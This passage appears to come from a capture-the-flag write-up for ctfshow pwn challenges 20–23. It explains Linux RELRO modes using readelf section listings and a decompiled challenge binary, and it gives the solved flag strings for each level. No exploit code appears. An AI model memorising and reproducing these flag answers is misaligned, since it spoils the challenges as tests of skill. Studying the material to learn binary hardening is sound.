       000000000000001c  0000000000000000   A       <span class="token number">5</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span> <span class="token number">5</span><span class="token punctuation">]</span> .dynsym           DYNSYM           0000000000400280  00000280
       0000000000000090  0000000000000018   A       <span class="token number">6</span>     <span class="token number">1</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span> <span class="token number">6</span><span class="token punctuation">]</span> .dynstr           STRTAB           0000000000400310  00000310
       000000000000004b  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">1</span>
  <span class="token punctuation">[</span> <span class="token number">7</span><span class="token punctuation">]</span> .gnu.version      VERSYM           000000000040035c  0000035c
       000000000000000c  0000000000000002   A       <span class="token number">5</span>     <span class="token number">0</span>     <span class="token number">2</span>
  <span class="token punctuation">[</span> <span class="token number">8</span><span class="token punctuation">]</span> .gnu.version_r    VERNEED          0000000000400368  00000368
       0000000000000020  0000000000000000   A       <span class="token number">6</span>     <span class="token number">1</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span> <span class="token number">9</span><span class="token punctuation">]</span> .rela.dyn         RELA             0000000000400388  00000388
       0000000000000030  0000000000000018   A       <span class="token number">5</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> .rela.plt         RELA             00000000004003b8  000003b8
       0000000000000048  0000000000000018  AI       <span class="token number">5</span>    <span class="token number">22</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> .init             PROGBITS         0000000000400400  00000400
       0000000000000017  0000000000000000  AX       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">4</span>
  <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> .plt              PROGBITS         0000000000400420  00000420
       0000000000000040  0000000000000010  AX       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">16</span>
  <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> .text             PROGBITS         0000000000400460  00000460
       0000000000000252  0000000000000000  AX       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">16</span>
  <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> .fini             PROGBITS         00000000004006b4  000006b4
       0000000000000009  0000000000000000  AX       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">4</span>
  <span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> .rodata           PROGBITS         00000000004006c0  000006c0
       000000000000053a  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> .eh_frame_hdr     PROGBITS         0000000000400bfc  00000bfc
       000000000000003c  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">4</span>
  <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> .eh_frame         PROGBITS         0000000000400c38  00000c38
       0000000000000100  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> .init_array       INIT_ARRAY       0000000000600d38  00000d38
       0000000000000008  0000000000000008  WA       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> .fini_array       FINI_ARRAY       0000000000600d40  00000d40
       0000000000000008  0000000000000008  WA       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> .dynamic          DYNAMIC          0000000000600d48  00000d48
       00000000000001d0  0000000000000010  WA       <span class="token number">6</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> .got              PROGBITS         0000000000600f18  00000f18
       0000000000000010  0000000000000008  WA       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> .got.plt          PROGBITS         0000000000600f28  00000f28
       0000000000000030  0000000000000008  WA       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> .data             PROGBITS         0000000000600f58  00000f58
       0000000000000010  0000000000000000  WA       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> .bss              NOBITS           0000000000600f68  00000f68
       0000000000000008  0000000000000000  WA       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">1</span>
  <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> .comment          PROGBITS         0000000000000000  00000f68
       0000000000000029  0000000000000001  MS       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">1</span>
  <span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> .symtab           SYMTAB           0000000000000000  00000f98
       00000000000005e8  0000000000000018          <span class="token number">27</span>    <span class="token number">43</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> .strtab           STRTAB           0000000000000000  00001580
       00000000000001f1  0000000000000000           <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">1</span>
  <span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> .shstrtab         STRTAB           0000000000000000  00001771
       0000000000000103  0000000000000000           <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">1</span>
Key to Flags:
  W <span class="token punctuation">(</span>write<span class="token punctuation">)</span>, A <span class="token punctuation">(</span>alloc<span class="token punctuation">)</span>, X <span class="token punctuation">(</span>execute<span class="token punctuation">)</span>, M <span class="token punctuation">(</span>merge<span class="token punctuation">)</span>, S <span class="token punctuation">(</span>strings<span class="token punctuation">)</span>, I <span class="token punctuation">(</span>info<span class="token punctuation">)</span>,
  L <span class="token punctuation">(</span>link order<span class="token punctuation">)</span>, O <span class="token punctuation">(</span>extra OS processing required<span class="token punctuation">)</span>, G <span class="token punctuation">(</span>group<span class="token punctuation">)</span>, T <span class="token punctuation">(</span>TLS<span class="token punctuation">)</span>,
  C <span class="token punctuation">(</span>compressed<span class="token punctuation">)</span>, x <span class="token punctuation">(</span>unknown<span class="token punctuation">)</span>, o <span class="token punctuation">(</span>OS specific<span class="token punctuation">)</span>, E <span class="token punctuation">(</span>exclude<span class="token punctuation">)</span>,
  D <span class="token punctuation">(</span>mbind<span class="token punctuation">)</span>, l <span class="token punctuation">(</span>large<span class="token punctuation">)</span>, p <span class="token punctuation">(</span>processor specific<span class="token punctuation">)</span>
</code></pre>

<p><strong>readelf</strong>一般用于查看ELF格式的文件信息，常见的文件如在Linux上的可执行文件，动态库(<em>.so)或者静态库(</em>.a) 等包含ELF格式的文件</p>
<p>Ask:</p>
<p>提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}</p>
<p>例如 .got可写.got.plt表可写其地址为0x400820 0x8208820</p>
<p>最终flag为ctfshow{1_1_0x400820_0x8208820}</p>
<p>若某个表不存在，则无需写其对应地址</p>
<p>如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token punctuation">.</span>got              PROGBITS         <span class="token number">0000000000600f</span><span class="token number">18</span>  <span class="token number">00000f</span><span class="token number">18</span>
     <span class="token number">0000000000000010</span>  <span class="token number">0000000000000008</span>  WA       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt          PROGBITS         <span class="token number">0000000000600f</span><span class="token number">28</span>  <span class="token number">00000f</span><span class="token number">28</span>
     <span class="token number">0000000000000030</span>  <span class="token number">0000000000000008</span>  WA       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span></code></pre>

<p>根据反编译后的代码进行测试</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  _QWORD <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// rax</span>

  <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400740<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_4007C0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400850<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_4008E0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400968<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400A00<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>aClassifyCtfsho<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Linux_Security_Mechanisms                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : What is RELRO protection ?                              "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">strtol</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span>v3 <span class="token operator">=</span> <span class="token number">1380273234LL</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"RELRO: %x\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>v3<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p><img src="pwn20.png" loading="lazy"></p>
<p>ctfshow{1_1_0x600f18_0x600f28}</p>
<h4 id="pwn21-Partial-RELRO"><a href="#pwn21-Partial-RELRO" class="headerlink" title="pwn21(Partial RELRO)"></a>pwn21(Partial RELRO)</h4><p><img src="pwn21_checksec.png" loading="lazy"></p>
<p>这次变成 <code>Partial RELRO</code> 了</p>
<p>Partial RELRO：一些段（包括.dynamic、.got等）在初始化后将会被标记为只读。在Ubuntu16.04（GCC-5.4.0）上默认开启Partial RELRO。</p>
<p>Full RELRO：除了Partial RELRO，延迟绑定将被禁止，所有的导入符号将在开始时被解析，.gotPlt段会被完全初始化为目标函数的最终地址，并被mprotect标记为只读但其实.got.plt会直接被合并到.got，也就看不到这段了。另外link_map和_dl_runtime_resolve的地址也不会被装入。开启Full RELRO会对程序启动时的性能造成一定的影响，但也只有这样才能防止攻击者篡改GOT。</p>
<p>当RELRO为Partial RELRO时，表示.got不可写而.got.plt可写。<br>当RELRO为FullRELRO时，表示.got不可写.got.plt也不可写。<br>当RELRO为No RELRO时，表示.got与.got.plt都可写。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">❯ readelf <span class="token parameter variable">-S</span> pwn21
There are <span class="token number">29</span> section headers, starting at offset 0x1950:

Section Headers:
  <span class="token punctuation">[</span>Nr<span class="token punctuation">]</span> Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  <span class="token punctuation">[</span> <span class="token number">0</span><span class="token punctuation">]</span>                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">0</span>
  <span class="token punctuation">[</span> <span class="token number">1</span><span class="token punctuation">]</span> .interp           PROGBITS         0000000000400238  00000238
       000000000000001c  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">1</span>
  <span class="token punctuation">[</span> <span class="token number">2</span><span class="token punctuation">]</span> .note.ABI-tag     NOTE             0000000000400254  00000254
       0000000000000020  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">4</span>
  <span class="token punctuation">[</span> <span class="token number">3</span><span class="token punctuation">]</span> .note.gnu.bu<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span> NOTE             0000000000400274  00000274
       0000000000000024  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">4</span>
  <span class="token punctuation">[</span> <span class="token number">4</span><span class="token punctuation">]</span> .gnu.hash         GNU_HASH         0000000000400298  00000298
       000000000000001c  0000000000000000   A       <span class="token number">5</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span> <span class="token number">5</span><span class="token punctuation">]</span> .dynsym           DYNSYM           00000000004002b8  000002b8
       0000000000000090  0000000000000018   A       <span class="token number">6</span>     <span class="token number">1</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span> <span class="token number">6</span><span class="token punctuation">]</span> .dynstr           STRTAB           0000000000400348  00000348
       000000000000004b  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">1</span>
  <span class="token punctuation">[</span> <span class="token number">7</span><span class="token punctuation">]</span> .gnu.version      VERSYM           0000000000400394  00000394
       000000000000000c  0000000000000002   A       <span class="token number">5</span>     <span class="token number">0</span>     <span class="token number">2</span>
  <span class="token punctuation">[</span> <span class="token number">8</span><span class="token punctuation">]</span> .gnu.version_r    VERNEED          00000000004003a0  000003a0
       0000000000000020  0000000000000000   A       <span class="token number">6</span>     <span class="token number">1</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span> <span class="token number">9</span><span class="token punctuation">]</span> .rela.dyn         RELA             00000000004003c0  000003c0
       0000000000000030  0000000000000018   A       <span class="token number">5</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> .rela.plt         RELA             00000000004003f0  000003f0
       0000000000000048  0000000000000018  AI       <span class="token number">5</span>    <span class="token number">22</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> .init             PROGBITS         0000000000400438  00000438
       0000000000000017  0000000000000000  AX       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">4</span>
  <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> .plt              PROGBITS         0000000000400450  00000450
       0000000000000040  0000000000000010  AX       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">16</span>
  <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> .text             PROGBITS         0000000000400490  00000490
       0000000000000252  0000000000000000  AX       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">16</span>
  <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> .fini             PROGBITS         00000000004006e4  000006e4
       0000000000000009  0000000000000000  AX       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">4</span>
  <span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> .rodata           PROGBITS         00000000004006f0  000006f0
       000000000000053a  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> .eh_frame_hdr     PROGBITS         0000000000400c2c  00000c2c
       000000000000003c  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">4</span>
  <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> .eh_frame         PROGBITS         0000000000400c68  00000c68
       0000000000000100  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> .init_array       INIT_ARRAY       0000000000600e10  00000e10
       0000000000000008  0000000000000008  WA       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> .fini_array       FINI_ARRAY       0000000000600e18  00000e18
       0000000000000008  0000000000000008  WA       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> .dynamic          DYNAMIC          0000000000600e20  00000e20
       00000000000001d0  0000000000000010  WA       <span class="token number">6</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> .got              PROGBITS         0000000000600ff0  00000ff0
       0000000000000010  0000000000000008  WA       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> .got.plt          PROGBITS         0000000000601000  00001000
       0000000000000030  0000000000000008  WA       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> .data             PROGBITS         0000000000601030  00001030
       0000000000000010  0000000000000000  WA       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> .bss              NOBITS           0000000000601040  00001040
       0000000000000008  0000000000000000  WA       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">1</span>
  <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> .comment          PROGBITS         0000000000000000  00001040
       0000000000000029  0000000000000001  MS       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">1</span>
  <span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> .symtab           SYMTAB           0000000000000000  00001070
       00000000000005e8  0000000000000018          <span class="token number">27</span>    <span class="token number">43</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> .strtab           STRTAB           0000000000000000  00001658
       00000000000001f1  0000000000000000           <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">1</span>
  <span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> .shstrtab         STRTAB           0000000000000000  00001849
       0000000000000103  0000000000000000           <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">1</span>
Key to Flags:
  W <span class="token punctuation">(</span>write<span class="token punctuation">)</span>, A <span class="token punctuation">(</span>alloc<span class="token punctuation">)</span>, X <span class="token punctuation">(</span>execute<span class="token punctuation">)</span>, M <span class="token punctuation">(</span>merge<span class="token punctuation">)</span>, S <span class="token punctuation">(</span>strings<span class="token punctuation">)</span>, I <span class="token punctuation">(</span>info<span class="token punctuation">)</span>,
  L <span class="token punctuation">(</span>link order<span class="token punctuation">)</span>, O <span class="token punctuation">(</span>extra OS processing required<span class="token punctuation">)</span>, G <span class="token punctuation">(</span>group<span class="token punctuation">)</span>, T <span class="token punctuation">(</span>TLS<span class="token punctuation">)</span>,
  C <span class="token punctuation">(</span>compressed<span class="token punctuation">)</span>, x <span class="token punctuation">(</span>unknown<span class="token punctuation">)</span>, o <span class="token punctuation">(</span>OS specific<span class="token punctuation">)</span>, E <span class="token punctuation">(</span>exclude<span class="token punctuation">)</span>,
  D <span class="token punctuation">(</span>mbind<span class="token punctuation">)</span>, l <span class="token punctuation">(</span>large<span class="token punctuation">)</span>, p <span class="token punctuation">(</span>processor specific<span class="token punctuation">)</span>
</code></pre>

<p>ctfshow{0_1_0x600ff0_0x601000}</p>
<h4 id="pwn22-Full-RELRO"><a href="#pwn22-Full-RELRO" class="headerlink" title="pwn22(Full RELRO)"></a>pwn22(Full RELRO)</h4><p><img src="pwn22_checksec.png" loading="lazy"></p>
<p><code>.got</code>和<code>.got.plt</code>都不可写</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"> readelf <span class="token parameter variable">-S</span> pwn22
There are <span class="token number">28</span> section headers, starting at offset 0x1900:

Section Headers:
  <span class="token punctuation">[</span>Nr<span class="token punctuation">]</span> Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  <span class="token punctuation">[</span> <span class="token number">0</span><span class="token punctuation">]</span>                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">0</span>
  <span class="token punctuation">[</span> <span class="token number">1</span><span class="token punctuation">]</span> .interp           PROGBITS         0000000000400238  00000238
       000000000000001c  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">1</span>
  <span class="token punctuation">[</span> <span class="token number">2</span><span class="token punctuation">]</span> .note.ABI-tag     NOTE             0000000000400254  00000254
       0000000000000020  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">4</span>
  <span class="token punctuation">[</span> <span class="token number">3</span><span class="token punctuation">]</span> .note.gnu.bu<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span> NOTE             0000000000400274  00000274
       0000000000000024  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">4</span>
  <span class="token punctuation">[</span> <span class="token number">4</span><span class="token punctuation">]</span> .gnu.hash         GNU_HASH         0000000000400298  00000298
       000000000000001c  0000000000000000   A       <span class="token number">5</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span> <span class="token number">5</span><span class="token punctuation">]</span> .dynsym           DYNSYM           00000000004002b8  000002b8
       0000000000000090  0000000000000018   A       <span class="token number">6</span>     <span class="token number">1</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span> <span class="token number">6</span><span class="token punctuation">]</span> .dynstr           STRTAB           0000000000400348  00000348
       000000000000004b  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">1</span>
  <span class="token punctuation">[</span> <span class="token number">7</span><span class="token punctuation">]</span> .gnu.version      VERSYM           0000000000400394  00000394
       000000000000000c  0000000000000002   A       <span class="token number">5</span>     <span class="token number">0</span>     <span class="token number">2</span>
  <span class="token punctuation">[</span> <span class="token number">8</span><span class="token punctuation">]</span> .gnu.version_r    VERNEED          00000000004003a0  000003a0
       0000000000000020  0000000000000000   A       <span class="token number">6</span>     <span class="token number">1</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span> <span class="token number">9</span><span class="token punctuation">]</span> .rela.dyn         RELA             00000000004003c0  000003c0
       0000000000000030  0000000000000018   A       <span class="token number">5</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> .rela.plt         RELA             00000000004003f0  000003f0
       0000000000000048  0000000000000018  AI       <span class="token number">5</span>    <span class="token number">21</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> .init             PROGBITS         0000000000400438  00000438
       0000000000000017  0000000000000000  AX       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">4</span>
  <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> .plt              PROGBITS         0000000000400450  00000450
       0000000000000040  0000000000000010  AX       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">16</span>
  <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> .text             PROGBITS         0000000000400490  00000490
       0000000000000252  0000000000000000  AX       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">16</span>
  <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> .fini             PROGBITS         00000000004006e4  000006e4
       0000000000000009  0000000000000000  AX       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">4</span>
  <span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> .rodata           PROGBITS         00000000004006f0  000006f0
       000000000000053a  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> .eh_frame_hdr     PROGBITS         0000000000400c2c  00000c2c
       000000000000003c  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">4</span>
  <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> .eh_frame         PROGBITS         0000000000400c68  00000c68
       0000000000000100  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> .init_array       INIT_ARRAY       0000000000600dc0  00000dc0
       0000000000000008  0000000000000008  WA       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> .fini_array       FINI_ARRAY       0000000000600dc8  00000dc8
       0000000000000008  0000000000000008  WA       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> .dynamic          DYNAMIC          0000000000600dd0  00000dd0
       00000000000001f0  0000000000000010  WA       <span class="token number">6</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> .got              PROGBITS         0000000000600fc0  00000fc0
       0000000000000040  0000000000000008  WA       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> .data             PROGBITS         0000000000601000  00001000
       0000000000000010  0000000000000000  WA       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> .bss              NOBITS           0000000000601010  00001010
       0000000000000008  0000000000000000  WA       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">1</span>
  <span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> .comment          PROGBITS         0000000000000000  00001010
       0000000000000029  0000000000000001  MS       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">1</span>
  <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> .symtab           SYMTAB           0000000000000000  00001040
       00000000000005d0  0000000000000018          <span class="token number">26</span>    <span class="token number">42</span>     <span class="token number">8</span>
  <span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> .strtab           STRTAB           0000000000000000  00001610
       00000000000001f1  0000000000000000           <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">1</span>
  <span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> .shstrtab         STRTAB           0000000000000000  00001801
       00000000000000fa  0000000000000000           <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">1</span>
Key to Flags:
  W <span class="token punctuation">(</span>write<span class="token punctuation">)</span>, A <span class="token punctuation">(</span>alloc<span class="token punctuation">)</span>, X <span class="token punctuation">(</span>execute<span class="token punctuation">)</span>, M <span class="token punctuation">(</span>merge<span class="token punctuation">)</span>, S <span class="token punctuation">(</span>strings<span class="token punctuation">)</span>, I <span class="token punctuation">(</span>info<span class="token punctuation">)</span>,
  L <span class="token punctuation">(</span>link order<span class="token punctuation">)</span>, O <span class="token punctuation">(</span>extra OS processing required<span class="token punctuation">)</span>, G <span class="token punctuation">(</span>group<span class="token punctuation">)</span>, T <span class="token punctuation">(</span>TLS<span class="token punctuation">)</span>,
  C <span class="token punctuation">(</span>compressed<span class="token punctuation">)</span>, x <span class="token punctuation">(</span>unknown<span class="token punctuation">)</span>, o <span class="token punctuation">(</span>OS specific<span class="token punctuation">)</span>, E <span class="token punctuation">(</span>exclude<span class="token punctuation">)</span>,
  D <span class="token punctuation">(</span>mbind<span class="token punctuation">)</span>, l <span class="token punctuation">(</span>large<span class="token punctuation">)</span>, p <span class="token punctuation">(</span>processor specific<span class="token punctuation">)</span>
</code></pre>

<p>ctfshow{0_0_0x600fc0}</p>
<h4 id="pwn23-dest"><a href="#pwn23-dest" class="headerlink" title="pwn23(dest)"></a>pwn23(dest)</h4><p><img src="pwn23_checksec.png" loading="lazy"></p>
<p>IDA 32位</p>
